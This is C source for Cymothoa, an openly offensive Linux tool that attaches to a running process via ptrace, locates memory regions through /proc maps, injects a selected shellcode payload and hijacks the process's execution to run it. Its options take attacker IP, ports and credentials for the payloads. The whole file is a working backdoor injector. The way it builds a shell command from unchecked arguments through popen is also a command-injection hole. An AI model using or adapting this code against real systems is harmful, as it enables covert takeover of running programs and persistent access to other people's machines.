/*
 * CYMOTHOA.C
 *
 * Copyright (C) 2009
 * codwizard <codwizard@gmail.com>, crossbower <crossbower@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */


#include "cymothoa.h"

// Print usage
void print_usage(int ret_val)
{
    printf("%s\n%s\n", banner, info);
    printf("%s", usage_text);
    exit(ret_val);
}

// Initialize payload buffer and vars
void payload_init(void)
{
    need_fork = 0;
    need_thread = 0;
    need_persistent = 0;
    need_alarm = 0;
    need_setitimer = 0;
    use_setitimer = 0;

    // check payload options and cmd-line arguments

    if(((payloads[args.payload_index].options & OPT_NEED_FORK) && args.no_fork==0) || args.fork)
        need_fork=1;

    if(((payloads[args.payload_index].options & OPT_NEED_THREAD) && args.no_thread==0) || args.thread)
        need_thread=1;

    if(((payloads[args.payload_index].options & OPT_NEED_PERSISTENT) && args.no_persistent==0) || args.persistent)
        need_persistent=1;

    if(((payloads[args.payload_index].options & OPT_NEED_ALARM) && args.no_alarm==0) || args.alarm)
        need_alarm=1;

    if(((payloads[args.payload_index].options & OPT_NEED_SETITIMER) && args.no_setitimer==0) || args.setitimer)
        need_setitimer=1;

    if(payloads[args.payload_index].options & OPT_USE_SETITIMER)
        use_setitimer=1;

    // calculate shellcode total size

    main_shellcode_len = payloads[args.payload_index].len;

    if      (need_fork)   payload_len = fork_shellcode_len + main_shellcode_len;
    else if (need_thread) payload_len = thread_shellcode_len + main_shellcode_len;
    else                  payload_len = main_shellcode_len;

    // allocate shellcode

    if(!(sh_buffer = malloc(payload_len + 1))) exit(-1);

    memset(sh_buffer, 0x0, payload_len + 1);

    if (need_fork) {
        memcpy(sh_buffer, fork_shellcode, fork_shellcode_len);
        memcpy(sh_buffer+fork_shellcode_len-1, payloads[args.payload_index].shellcode, main_shellcode_len);
    }
    else if (need_thread) {
        memcpy(sh_buffer, thread_shellcode, thread_shellcode_len);
        memcpy(sh_buffer+thread_shellcode_len-1, payloads[args.payload_index].shellcode, main_shellcode_len);
    }
    else {
        memcpy(sh_buffer, payloads[args.payload_index].shellcode, main_shellcode_len);
    }
}

// Free the payload buffer
void payload_destroy(void)
{
    free(sh_buffer);
}

// Search library region
long long search_lib_region(pid_t pid, char *lib_name, int perms)
{
    FILE *maps = NULL;
    char cmd[1024];
    char output[1024];

    long long region=0;

    if (lib_name==NULL) {
        // search /lib/ld-<version>.so region, usually a good memory location
        lib_name = "ld.*.so";
    }

    // assemble cmd
    if (perms == MEM_WRITE) {
        // writable memory (mapped rw-p)
        sprintf(cmd, "cat /proc/%d/maps | grep %s | grep ' rw-p '", pid, lib_name);
    }
    else {
        // executable memory (mapped r-xp)
        sprintf(cmd, "cat /proc/%d/maps | grep %s | grep ' r-xp '", pid, lib_name);
    }

    // read output
    maps = popen(cmd, "r");
    fgets(output, 1024-1, maps);
    pclose(maps);

    // get region
    sscanf(output, "%llx", &region);

    return region;
}


// Injection Function
int ptrace_inject(pid_t pid, long long addr, void *buf, int buflen)
{
	#ifdef __i386__
	int memaddr = (int)addr;
	int data;
	#endif
	#ifdef __x86_64__
	long long memaddr = addr;
    long long data;
	#endif
	
    while (buflen > 0) {
        memcpy(&data, buf, BLOCK_SIZE);

        if ( ptrace(PTRACE_POKETEXT, pid, memaddr, data) < 0 ) {
            perror("Oopsie!");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);

            return -1;
       }

       memaddr += BLOCK_SIZE;
       buf     += BLOCK_SIZE;
       buflen  -= BLOCK_SIZE;
    }

    return 1;
}

// Infect function
int ptrace_infect()
{
        // set standard arguments
        pid_t pid = args.pid;

        // other variables
        long long ptr=0;
		int error=0;
        struct user_regs_struct reg;

        printf("[+] attaching to process %d\n",pid);

        error = ptrace(PTRACE_ATTACH,pid,0,0);    // attaching to process
        if (error == -1) {
            printf("[-] attaching failed. exiting...\n");
            exit(1);
        }

        waitpid(pid,NULL,0);

        ptrace(PTRACE_GETREGS,pid,&reg,&reg);       // general purpose registers

        printf("\n register info: \n");
        printf(" -----------------------------------------------------------\n");
        printf(" eax value: 0x%lx\t", reg.AX);
        printf(" ebx value: 0x%lx\n", reg.BX);
        printf(" esp value: 0x%lx\t", reg.STACK_POINTER);
        printf(" eip value: 0x%lx\n", reg.INST_POINTER);
        printf(" ------------------------------------------------------------\n\n");

        reg.STACK_POINTER -= BLOCK_SIZE; // decrement STACK_POINTER

        printf("[+] new esp: 0x%.8lx\n", reg.STACK_POINTER);

        ptrace(PTRACE_POKETEXT, pid, reg.STACK_POINTER, reg.INST_POINTER);  // poke INST_POINTER -> STACK_POINTER

        // print preamble options
        if (need_fork)
            printf("[+] payload preamble: fork\n", reg.STACK_POINTER);
        else if (need_thread)
            printf("[+] payload preamble: thread\n", reg.STACK_POINTER);
        else if (need_alarm)
            printf("[+] payload preamble: alarm\n", reg.STACK_POINTER);
        else if (need_setitimer || use_setitimer)
            printf("[+] payload preamble: setitimer\n", reg.STACK_POINTER);

        // get the address for our shellcode
        ptr = search_lib_region(pid, args.lib_name, MEM_EXEC);

        printf("[+] injecting code into 0x%.8x\n", ptr);

        reg.INST_POINTER = ptr + 2;
        printf("[+] copy general purpose registers\n");
        ptrace(PTRACE_SETREGS, pid, &reg, &reg);

        // get the address for persistent memory
        persistent_addr = search_lib_region(pid, args.lib_name_mem, MEM_WRITE);

        if (need_persistent)
          printf("[+] persistent memory at 0x%.8x\n", persistent_addr);

        // personalize shellcode if required
        personalize_shellcode();

        // inject the shellcode
        ptrace_inject(pid, ptr, sh_buffer, payload_len+1);

        // detach from process
        printf("[+] detaching from %d\n\n", pid);

        ptrace(PTRACE_DETACH, pid, 0, 0);

        printf("[+] infected!!!\n");

        return(0);
}

/*
 * This function parse the arguments of the program and fills args structure
 */
int parse_arguments(int argc,char **argv)
{

    int c;
    opterr = 0;
    payload_count = 0;

    // clean the arguments structure
    memset(&args, 0, sizeof(args));
    args.payload_index=-1;

    // list of the options getopt have to get
    char short_options[] = "p:s:l:m:hSfFbBwWaAtTj:k:x:y:r:z:o:c:";

    // PARSE ARGUMENTS...

    while ((c = getopt (argc, argv, short_options)) != -1) {
        switch (c) {

            // main options

            case 'p': // process pid
                args.pid = atoi(optarg);
                break;

            case 's': // payload index (shellcode)
                args.payload_index = atoi(optarg);
                break;

            case 'l': // library region where to put the shellcode
                args.lib_name = optarg;
                break;

            case 'm': // memory region for persistent memory
                args.lib_name_mem = optarg;
                break;

            case 'h': // show help/usage
                args.show_help = 1;
                break;

            case 'S': // show payloads
                args.show_payloads = 1;
                break;

            // injection options

            case 'f': // use fork shellcode
                args.fork = 1;
                break;

            case 'F': // don't use fork shellcode
                args.no_fork = 1;
                break;

            case 'b': // create payload thread
                args.thread = 1;
                break;

            case 'B': // don't create payload thread
                args.no_thread = 1;
                break;

            case 'w': // pass persistent memory address
                args.persistent = 1;
                break;

            case 'W': // don't pass persistent memory address
                args.no_persistent = 1;
                break;

            case 'a': // use alarm scheduler
                args.alarm = 1;
                break;

            case 'A': // don't use alarm scheduler
                args.no_alarm = 1;
                break;

            case 't': // use setitimer scheduler
                args.setitimer = 1;
                break;

            case 'T': // don't use setitimer scheduler
                args.no_setitimer = 1;
                break;

            // payload arguments

            case 'j': // timer_seconds
                args.timer_sec = atoi(optarg);
                break;

            case 'k': // timer microseconds
                args.timer_micro = atoi(optarg);
                break;

            case 'x': // option ip address
                args.my_ip = inet_addr(optarg);
                break;

            case 'y': // option port number
                args.my_port = htons(atoi(optarg));
                break;

            case 'r': // option port number 2
                args.my_port2 = htons(atoi(optarg));
                break;

            case 'z': // option username
                args.my_username = optarg;
                break;

            case 'o': // option password
                args.my_password = optarg;
                break;

            case 'c': // script code
                args.my_script = optarg;
                break;

            case '?':
                fprintf (stderr, "Error with option: %c. Check the usage...\n", optopt);
                return 0;
        }
    }

    // ACTIONS...

    // show help/usage screen
    if (args.show_help) {
        print_usage(0);
    }

    // show payloads
    if (args.show_payloads) {
        int count = 0;

        printf("\n");
        while(payloads[count].shellcode != NULL) {
            printf("%d - %s\n", count, payloads[count].description);
            count++;
        }

        exit(0);
    }

    // COUNT PAYLOADS

    while(payloads[payload_count].shellcode != NULL) payload_count++;

    // CHECK ARGUMENTS...

    if (args.pid==0 || args.payload_index < 0 || args.payload_index > payload_count) {
        print_usage(1);
    }

    return 1;
}

// Main function
int main(int argc,char **argv)
{

    // parse and check command line arguments
    if ( parse_arguments(argc, argv) == 0 ) {
        return 1;
    }

    // initialize payload buffer and vars
    payload_init();

    // free payload buffer when exiting or when an error occures
    atexit(payload_destroy);

    // infect the process
    if ( ptrace_infect() == 0 ) {
        return 1;
    }

    return 0;
}


